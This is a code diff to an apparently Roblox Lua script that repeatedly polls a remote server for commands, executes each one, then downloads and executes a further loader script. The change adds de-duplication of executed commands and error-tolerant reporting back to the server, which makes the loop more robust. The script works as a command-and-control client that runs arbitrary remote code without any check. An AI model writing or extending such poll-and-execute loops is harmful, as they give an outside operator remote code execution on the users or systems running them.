@@ -5,6 +5,9 @@
 local SERVER_URL = "https://coachtopia.fun"
 local POLL_INTERVAL = 2
 
+-- Track executed commands in this session to prevent re-execution
+local executedThisSession = {}
+
 -- HTTP request function
 local function httpGet(url)
     local success, response = pcall(function()
@@ -71,7 +74,16 @@ while true do
                 print("[POLL] Found", #data.commands, "command(s)")
                 
                 for _, cmd in ipairs(data.commands) do
+                    -- Skip if already executed in this session
+                    if executedThisSession[cmd.name] then
+                        print("[EXECUTE] Skipping already executed command:", cmd.name)
+                        continue
+                    end
+                    
                     print("[EXECUTE] Executing command:", cmd.name)
+                    
+                    -- Mark as executed in this session
+                    executedThisSession[cmd.name] = true
                     
                     -- Execute the main script
                     local execSuccess, execErr = pcall(function()
@@ -84,8 +96,10 @@ while true do
                         warn("[EXECUTE] Main script failed:", execErr)
                     end
                     
-                    -- Delete command from server after execution
-                    httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
+                    -- Try to delete command from server
+                    pcall(function()
+                        httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
+                    end)
                     
                     -- After main script, load and execute loader script
                     print("[LOADER] Fetching loader script...")
